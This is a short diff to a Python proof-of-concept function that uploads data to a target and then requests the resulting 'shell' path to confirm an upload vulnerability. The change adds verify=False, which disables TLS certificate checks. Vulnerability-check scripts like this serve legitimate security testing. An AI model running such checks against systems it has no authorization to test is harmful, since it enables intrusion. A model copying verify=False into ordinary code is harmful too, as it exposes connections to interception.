@@ -31,8 +31,8 @@ def poc(url):
     }
 
     try:
-        r = requests.post(url=upload_path, data=post_data, headers=header_data, timeout=3)
-        shell = requests.get(shell_path)
+        r = requests.post(url=upload_path, data=post_data, headers=header_data, timeout=3, verify=False)
+        shell = requests.get(shell_path, verify=False)
         if r.status_code is 200 and cipher in shell.content:
             return True
 
